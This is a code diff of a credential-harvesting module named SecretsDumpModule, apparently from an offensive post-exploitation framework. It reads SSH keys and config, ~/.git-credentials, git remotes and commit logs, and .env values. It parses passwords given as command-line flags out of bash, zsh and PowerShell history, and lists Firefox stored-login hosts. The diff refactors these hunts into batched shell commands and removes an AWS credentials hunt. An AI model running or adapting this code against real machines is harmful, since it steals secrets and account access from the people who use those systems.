@@ -2,15 +2,8 @@ from __future__ import annotations
 from koi.modules.blueprint import KoiModule
 import json
 import re
-import os
 from typing import Any, Dict, List
 
-
-CRED_PATTERNS = re.compile(
-    r'(password|passwd|pwd|api.?key|secret|token|authorization|bearer|'
-    r'aws_|export.*=|impacket|secretsdump|hashes)',
-    re.IGNORECASE
-)
 
 ENV_CRED_PATTERNS = re.compile(
     r'(password|passwd|secret|token|api.?key|key|credential|auth|user|username|'
@@ -44,20 +37,110 @@ _SENSITIVE_VALUE_RE = re.compile(
 )
 
 
-def parse_shell_history(content: str) -> List[str]:
-    commands = []
+_LONG_PASSWORD_FLAGS = re.compile(
+    r'''(?:^|\s)'''
+    r'''(--password|--passwd|--pass|--pwd'''
+    r'''|--db-password|--dbpassword'''
+    r'''|--auth-password|--login-password'''
+    r'''|--admin-password|--root-password)'''
+    r'''(?:=|\s+)(\S+)''',
+)
+
+_SHORT_P_INLINE_CMDS = frozenset({
+    'mysql', 'mysqldump', 'mysqladmin', 'mysqlimport',
+    'mariadb', 'mariadb-dump',
+})
+
+# Commands where -p is NOT a password flag.
+_SHORT_P_BLACKLIST = frozenset({
+    'ssh', 'scp', 'sftp',
+    'nmap', 'masscan',
+    'nc', 'ncat', 'netcat', 'socat',
+    'docker', 'podman', 'kubectl',
+    'mkdir', 'cp', 'mv', 'install', 'rsync',
+    'tar', 'gzip', 'bzip2', 'xz',
+    'curl', 'wget',
+    'python', 'python3', 'python2', 'ruby', 'perl', 'node',
+    'grep', 'egrep', 'fgrep', 'rg', 'ag',
+    'find', 'fd',
+    'ls', 'stat', 'file',
+    'ss', 'netstat', 'lsof',
+    'ping', 'traceroute', 'mtr',
+    'kill', 'pkill',
+    'chown', 'chmod',
+    'sed', 'awk', 'sort', 'head', 'tail', 'cut', 'tr', 'wc',
+    'openssl',
+    'java', 'javac',
+    'gcc', 'g++', 'make', 'cmake',
+    'dpkg', 'rpm', 'apt', 'apt-get', 'yum', 'dnf', 'pacman',
+    'systemctl', 'journalctl',
+    'git',
+})
+
+_SHORT_P_INLINE_RE = re.compile(r'(?:^|\s)-p([^\s-]\S*)')
+_SHORT_P_SPACE_RE = re.compile(r'(?:^|\s)-p\s+(\S+)')
+
+_USERNAME_RE = re.compile(
+    r'(?:^|\s)(?:-u|--user|--username|-U|--login)\s+(\S+)'
+)
+_USERNAME_INLINE_RE = re.compile(r'(?:^|\s)-u(\S+)')
+
+
+def _extract_username(line: str) -> str:
+    m = _USERNAME_RE.search(line)
+    if m:
+        return m.group(1).strip("'\"")
+    m = _USERNAME_INLINE_RE.search(line)
+    if m:
+        return m.group(1).strip("'\"")
+    return ''
+
+
+def extract_cli_passwords(content: str) -> List[List[str]]:
+    found: List[List[str]] = []
+    seen: set[tuple[str, str, str]] = set()
+
     for line in content.split('\n'):
         line = line.strip()
         if not line or line.startswith('#'):
             continue
         if line.startswith(': ') and ';' in line:
             line = line.split(';', 1)[1]
-        line = re.sub(r'\s+', ' ', line)
-        if CRED_PATTERNS.search(line):
-            if len(line) > 120:
-                line = line[:117] + "..."
-            commands.append(line)
-    return commands[:20]
+        line = re.sub(r'\s+', ' ', line).strip()
+
+        tokens = line.split()
+        if not tokens:
+            continue
+        cmd = tokens[0].rsplit('/', 1)[-1]
+        if cmd.startswith('-') or cmd.startswith('('):
+            continue
+
+        user = None
+
+        def _add(source: str, val: str) -> None:
+            nonlocal user
+            val = val.strip("'\"")
+            if not val or val.startswith('-') or len(val) < 2:
+                return
+            if user is None:
+                user = _extract_username(line)
+            key = (source, user, val)
+            if key not in seen:
+                seen.add(key)
+                found.append([user, val, source])
+
+        for m in _LONG_PASSWORD_FLAGS.finditer(line):
+            _add(cmd, m.group(2))
+
+        if cmd in _SHORT_P_INLINE_CMDS:
+            for m in _SHORT_P_INLINE_RE.finditer(line):
+                _add(cmd, m.group(1))
+
+        if cmd not in _SHORT_P_BLACKLIST:
+            for m in _SHORT_P_SPACE_RE.finditer(line):
+                _add(cmd, m.group(1))
+
+    return found
 
 
 def parse_env_file(content: str) -> Dict[str, str]:
@@ -173,16 +256,14 @@ class SecretsDumpModule(KoiModule):
         # (display label, hunt method). Add a source by adding one row.
         hunts = [
             ("SSH Keys",              self._hunt_ssh_keys),
-            ("Git Credentials",       self._hunt_git_creds),
-            ("Shell History",         self._hunt_bash_history),
+            ("Git",                   self._hunt_git),
+            ("CLI Passwords",         self._hunt_bash_history),
             ("Environment Variables", self._hunt_env_vars),
             ("PostgreSQL (.pgpass)",  self._hunt_pgpass),
             ("Docker Credentials",    self._hunt_docker),
             (".env Files",            self._hunt_env_files),
             ("API Keys",              self._hunt_api_keys),
-            ("AWS Credentials",       self._hunt_aws),
             ("Process Environment",   self._hunt_process_env),
-            ("Git Diffs",             self._hunt_git_diffs),
             ("Browser Secrets",       self._hunt_browser_secrets),
         ]
 
@@ -224,35 +305,52 @@ class SecretsDumpModule(KoiModule):
             self.box(f"[{category}]", {"data": str(entries)})
 
     def _hunt_ssh_keys(self) -> int:
+        output = self._try_exec(
+            'echo "===KEYS==="; find ~/.ssh/ -maxdepth 1 -type f 2>/dev/null;'
+            ' echo "===CONFIG==="; cat ~/.ssh/config 2>/dev/null;'
+            ' echo "===AGENT==="; ssh-add -l 2>/dev/null'
+        )
+        if not output:
+            return 0
+
+        sections: dict[str, str] = {}
+        current = None
+        lines: list[str] = []
+        for line in output.split('\n'):
+            if line.strip() in ('===KEYS===', '===CONFIG===', '===AGENT==='):
+                if current:
+                    sections[current] = '\n'.join(lines)
+                current = line.strip()
+                lines = []
+            else:
+                lines.append(line)
+        if current:
+            sections[current] = '\n'.join(lines)
+
         count = 0
         key_re = re.compile(r'(id_.*|key_.*|.*_rsa|.*_ed25519)')
+        rows = []
+        for path in sections.get('===KEYS===', '').split('\n'):
+            path = path.strip()
+            if not path:
+                continue
+            name = path.rsplit('/', 1)[-1]
+            if key_re.match(name):
+                rows.append([name, path])
+        if rows:
+            self.table("SSH Keys", ["key", "path"], rows[:15])
+            count += len(rows[:15])
 
-        keys_output = self._try_exec(
-            "find ~/.ssh/ -maxdepth 1 -type f 2>/dev/null"
-        )
-        if keys_output:
-            rows = []
-            for path in keys_output.split('\n'):
-                path = path.strip()
-                if not path:
-                    continue
-                name = path.rsplit('/', 1)[-1]
-                if key_re.match(name):
-                    rows.append([name, path])
-            if rows:
-                self.table("SSH Keys", ["key", "path"], rows[:15])
-                count += len(rows[:15])
-
-        extras = {}
-        ssh_config = self._try_exec("cat ~/.ssh/config 2>/dev/null")
-        if ssh_config:
-            parsed = parse_ssh_config(ssh_config)
+        extras: dict[str, str] = {}
+        config_raw = sections.get('===CONFIG===', '')
+        if config_raw.strip():
+            parsed = parse_ssh_config(config_raw)
             if parsed:
                 extras["SSH Hosts Configured"] = str(len(parsed))
 
-        agent_keys = self._try_exec("ssh-add -l 2>/dev/null")
-        if agent_keys:
-            key_count = len([l for l in agent_keys.split('\n')
+        agent_raw = sections.get('===AGENT===', '')
+        if agent_raw.strip():
+            key_count = len([l for l in agent_raw.split('\n')
                            if l.strip() and any(k in l for k in ['RSA', 'ED25519', 'ECDSA'])])
             if key_count > 0:
                 extras["SSH Agent Keys Loaded"] = f"{key_count} keys"
@@ -263,59 +361,74 @@ class SecretsDumpModule(KoiModule):
 
         return count
 
-    def _hunt_git_creds(self) -> dict:
-        """Extract git credentials."""
-        result = {}
-
-        # .git-credentials
-        git_creds = self._try_exec("cat ~/.git-credentials 2>/dev/null")
-        if git_creds:
-            result[".git-credentials"] = git_creds
-
-        # Git remotes from local repos
-        git_dirs = self._try_exec(
-            "find ~ -maxdepth 4 -name '.git' -type d 2>/dev/null"
+    def _hunt_git(self) -> int:
+        output = self._try_exec(
+            "printf '===CREDS===\\n'; cat ~/.git-credentials 2>/dev/null;"
+            " printf '\\n===END===\\n';"
+            " find ~ -maxdepth 4 -name '.git' -type d 2>/dev/null |"
+            " while IFS= read -r d; do"
+            " repo=$(dirname \"$d\");"
+            " printf '===REPO:%s===\\n' \"$repo\";"
+            " printf '---CONFIG---\\n'; cat \"$d/config\" 2>/dev/null;"
+            " printf '\\n---LOG---\\n';"
+            " git -C \"$repo\" --no-pager log --oneline -n 20 2>/dev/null;"
+            " done"
         )
+        if not output:
+            return 0
 
-        if git_dirs:
-            git_table = {}
-            for gitdir in git_dirs.split('\n'):
-                gitdir = gitdir.strip()
-                if not gitdir:
-                    continue
-                repo = os.path.dirname(gitdir)
-                config_path = self._shell_quote(f"{gitdir}/config")
-                git_config = self._try_exec(f"cat {config_path} 2>/dev/null")
-                if git_config:
-                    parsed = parse_git_config(git_config)
-                    for remote_section, url in parsed.items():
-                        repo_name = repo.split('/')[-1]
-                        if repo_name not in git_table:
-                            git_table[repo_name] = url
-            if git_table:
-                result["Git Remotes"] = git_table
+        count = 0
+        creds_match = re.search(r'===CREDS===\n(.*?)\n===END===', output, re.DOTALL)
+        if creds_match and creds_match.group(1).strip():
+            self.box("[.git-credentials]", {"content": creds_match.group(1).strip()})
+            count += 1
 
-        return result
+        secret_keywords = frozenset((
+            'password', 'secret', 'token', 'api_key',
+            'credential', 'key', 'auth', 'bearer', 'authorization',
+        ))
+        remote_rows: list[list[str]] = []
+        suspect_rows: list[list[str]] = []
 
-    def _hunt_bash_history(self) -> dict:
-        """Check shell history for credentials."""
-        result = {}
+        for repo_m in re.finditer(
+            r'===REPO:(.*?)===\n(.*?)(?====REPO:|$)', output, re.DOTALL,
+        ):
+            repo_path = repo_m.group(1)
+            body = repo_m.group(2)
+            repo_name = repo_path.rsplit('/', 1)[-1]
 
-        # Bash history
-        bash_raw = self._try_exec("cat ~/.bash_history 2>/dev/null")
-        if bash_raw:
-            bash_cmds = parse_shell_history(bash_raw)
-            if bash_cmds:
-                result["Bash History"] = bash_cmds
+            config_part, _, log_part = body.partition('---LOG---')
+            config_part = config_part.replace('---CONFIG---', '', 1)
 
-        # Zsh history
-        zsh_raw = self._try_exec("cat ~/.zsh_history 2>/dev/null")
-        if zsh_raw:
-            zsh_cmds = parse_shell_history(zsh_raw)
-            if zsh_cmds:
-                result["Zsh History"] = zsh_cmds
+            for url in parse_git_config(config_part).values():
+                remote_rows.append([repo_name, url])
 
-        return result
+            for line in log_part.split('\n'):
+                line = line.strip()
+                if line and any(kw in line.lower() for kw in secret_keywords):
+                    suspect_rows.append([repo_name, line])
+
+        if remote_rows:
+            self.table("Git Remotes", ["repo", "url"], remote_rows[:20])
+            count += len(remote_rows[:20])
+
+        if suspect_rows:
+            self.table("Suspicious Commits", ["repo", "commit"], suspect_rows[:15])
+            count += len(suspect_rows[:15])
+
+        return count
+
+    def _hunt_bash_history(self) -> int:
+        raw = self._try_exec(
+            "{ cat ~/.bash_history 2>/dev/null; cat ~/.zsh_history 2>/dev/null; }"
+        )
+        if not raw:
+            return 0
+        cli_passwords = extract_cli_passwords(raw)
+        if cli_passwords:
+            self.table("CLI Passwords", ["user", "password", "source"], cli_passwords)
+            return len(cli_passwords)
+        return 0
 
     def _hunt_env_vars(self) -> dict:
         result = {}
@@ -378,16 +491,6 @@ class SecretsDumpModule(KoiModule):
             result["API Keys & Configs"] = output
         return result
 
-    def _hunt_aws(self) -> dict:
-        """Hunt AWS credentials."""
-        result = {}
-
-        aws_creds = self._try_exec("cat ~/.aws/credentials 2>/dev/null")
-        if aws_creds:
-            result["AWS Credentials"] = aws_creds
-
-        return result
-
     def _hunt_env_files(self) -> int:
         output = self._try_exec(
             "find ~ -maxdepth 5 -type f -name '.env*' 2>/dev/null | head -15 | "
@@ -404,7 +507,7 @@ class SecretsDumpModule(KoiModule):
             if line.startswith('===FILE:') and line.endswith('==='):
                 if current_file and current_lines:
                     for key, val in parse_env_file('\n'.join(current_lines)).items():
-                        rows.append([current_file, key, val])
+                        rows.append([key, val, current_file])
                 current_file = line[8:-3]
                 current_lines = []
             else:
@@ -412,10 +515,10 @@ class SecretsDumpModule(KoiModule):
 
         if current_file and current_lines:
             for key, val in parse_env_file('\n'.join(current_lines)).items():
-                rows.append([current_file, key, val])
+                rows.append([key, val, current_file])
 
         if rows:
-            self.table(".env Files", ["file", "variable", "value"], rows[:30])
+            self.table(".env Files", ["variable", "value", "file"], rows[:30])
             return len(rows[:30])
         return 0
 
@@ -461,99 +564,78 @@ class SecretsDumpModule(KoiModule):
             return len(rows[:20])
         return 0
 
-    def _hunt_git_diffs(self) -> dict:
-        """Hunt for recent git changes that might contain secrets."""
-        result = {}
-
-        git_dirs = self._try_exec(
-            "find ~ -maxdepth 4 -name '.git' -type d 2>/dev/null"
-        )
-
-        if not git_dirs:
-            return result
-
-        secret_keywords = ['password', 'secret', 'token', 'api_key', 'credential', 'key', 'auth', 'bearer', 'authorization']
-        repos_with_secrets = {}
-
-        for gitdir in git_dirs.split('\n'):
-            gitdir = gitdir.strip()
-            if not gitdir:
-                continue
-
-            repo = os.path.dirname(gitdir)
-            repo_name = repo.split('/')[-1]
-
-            # Get git log with format for better parsing
-            git_log = self._try_exec(
-                f"cd {self._shell_quote(repo)} && "
-                f"git --no-pager log --oneline -n 20 2>/dev/null"
-            )
-
-            if git_log:
-                suspicious_commits = []
-                for line in git_log.split('\n'):
-                    line = line.strip()
-                    if not line:
-                        continue
-                    if any(kw in line.lower() for kw in secret_keywords):
-                        suspicious_commits.append(line)
-
-                if suspicious_commits:
-                    repos_with_secrets[repo_name] = suspicious_commits[:5]
-
-        if repos_with_secrets:
-            result["Git Commits with Secrets"] = repos_with_secrets
-
-        return result
-
     def _hunt_browser_secrets(self) -> dict:
-        """Hunt for Chrome and Firefox stored secrets."""
-        result = {}
-
-        # Chrome - check for Login Data
-        chrome_paths = self._try_exec(
-            "find ~/.config ~/.local/share -type f -name 'Login Data' 2>/dev/null"
+        output = self._try_exec(
+            "printf '===CHROME===\\n';"
+            " find ~/.config ~/.local/share -type f -name 'Login Data' 2>/dev/null;"
+            " printf '===FFKEYS===\\n';"
+            " find ~/.mozilla/firefox -type f \\( -name 'key4.db' -o -name 'key3.db' \\) 2>/dev/null;"
+            " printf '===FFLOGINS===\\n';"
+            " find ~/.mozilla/firefox -type f -name 'logins.json' 2>/dev/null |"
+            " while IFS= read -r f; do"
+            " printf '===FILE:%s===\\n' \"$f\"; cat \"$f\" 2>/dev/null;"
+            " done"
         )
-        if chrome_paths:
-            chrome_files = [f.strip() for f in chrome_paths.split('\n') if f.strip()]
-            if chrome_files:
-                result["Chrome Profiles"] = f"{len(chrome_files)} profile(s) found"
+        if not output:
+            return {}
 
-        # Firefox - check for key databases
-        firefox_keys = self._try_exec(
-            "find ~/.mozilla/firefox -type f \\( -name 'key4.db' -o -name 'key3.db' \\) 2>/dev/null"
-        )
-        if firefox_keys:
-            firefox_key_files = [f.strip() for f in firefox_keys.split('\n') if f.strip()]
-            if firefox_key_files:
-                result["Firefox Encrypted Keys"] = f"{len(firefox_key_files)} database(s)"
+        sections: dict[str, str] = {}
+        current = None
+        lines: list[str] = []
+        for line in output.split('\n'):
+            stripped = line.strip()
+            if stripped in ('===CHROME===', '===FFKEYS===', '===FFLOGINS==='):
+                if current:
+                    sections[current] = '\n'.join(lines)
+                current = stripped
+                lines = []
+            else:
+                lines.append(line)
+        if current:
+            sections[current] = '\n'.join(lines)
 
-        # Firefox - extract hostnames from logins.json
-        logins_paths = self._try_exec(
-            "find ~/.mozilla/firefox -type f -name 'logins.json' 2>/dev/null"
-        )
-        if logins_paths:
-            hosts = set()
-            for lpath in logins_paths.strip().split('\n'):
-                lpath = lpath.strip()
-                if not lpath:
-                    continue
-                raw = self._try_exec(f"cat {self._shell_quote(lpath)} 2>/dev/null")
-                if not raw:
-                    continue
-                try:
-                    data = json.loads(raw)
-                    if isinstance(data, dict):
-                        for login in data.get('logins', []):
-                            host = login.get('hostname', '')
-                            if host and not host.startswith('chrome://'):
-                                hosts.add(host)
-                except (json.JSONDecodeError, ValueError):
-                    pass
+        result: dict[str, str] = {}
+
+        chrome_raw = sections.get('===CHROME===', '')
+        chrome_files = [f.strip() for f in chrome_raw.split('\n') if f.strip()]
+        if chrome_files:
+            result["Chrome Profiles"] = f"{len(chrome_files)} profile(s) found"
+
+        ffkeys_raw = sections.get('===FFKEYS===', '')
+        ffkey_files = [f.strip() for f in ffkeys_raw.split('\n') if f.strip()]
+        if ffkey_files:
+            result["Firefox Encrypted Keys"] = f"{len(ffkey_files)} database(s)"
+
+        logins_raw = sections.get('===FFLOGINS===', '')
+        if logins_raw.strip():
+            hosts: set[str] = set()
+            current_content: list[str] = []
+            for line in logins_raw.split('\n'):
+                if line.startswith('===FILE:') and line.endswith('==='):
+                    if current_content:
+                        self._parse_ff_logins('\n'.join(current_content), hosts)
+                    current_content = []
+                else:
+                    current_content.append(line)
+            if current_content:
+                self._parse_ff_logins('\n'.join(current_content), hosts)
             if hosts:
-                result["Firefox Stored Hosts"] = ", ".join(sorted(list(hosts))[:15])
+                result["Firefox Stored Hosts"] = ", ".join(sorted(hosts)[:15])
 
         return result
+
+    @staticmethod
+    def _parse_ff_logins(raw: str, hosts: set[str]) -> None:
+        try:
+            data = json.loads(raw)
+        except (json.JSONDecodeError, ValueError):
+            return
+        if not isinstance(data, dict):
+            return
+        for login in data.get('logins', []):
+            host = login.get('hostname', '')
+            if host and not host.startswith('chrome://'):
+                hosts.add(host)
 
     def _run_windows(self) -> None:
         """Hunt for credentials on Windows targets."""
@@ -582,7 +664,6 @@ class SecretsDumpModule(KoiModule):
             self.warn("No obvious credentials found")
 
     def _hunt_ps_history(self) -> dict:
-        """Extract PowerShell history."""
         result = {}
 
         ps_hist = self._win_query(
@@ -590,9 +671,17 @@ class SecretsDumpModule(KoiModule):
             "Where-Object {$_.CommandLine -match '(password|passwd|api|secret|token|credential)'}; "
             "if($hist) {$hist | Select-Object -ExpandProperty CommandLine | Select-Object -First 20 | Out-String}}"
         )
-
         if ps_hist.strip():
-            result["PS History"] = ps_hist
+            result["PS Session History"] = ps_hist
+
+        ps_file = self._win_query(
+            "&{$f = (Get-PSReadlineOption -EA SilentlyContinue).HistorySavePath; "
+            "if($f -and (Test-Path $f)) {Get-Content $f -Raw}}"
+        )
+        if ps_file and ps_file.strip():
+            cli_passwords = extract_cli_passwords(ps_file)
+            if cli_passwords:
+                self.table("CLI Passwords", ["user", "password", "source"], cli_passwords)
 
         return result
 
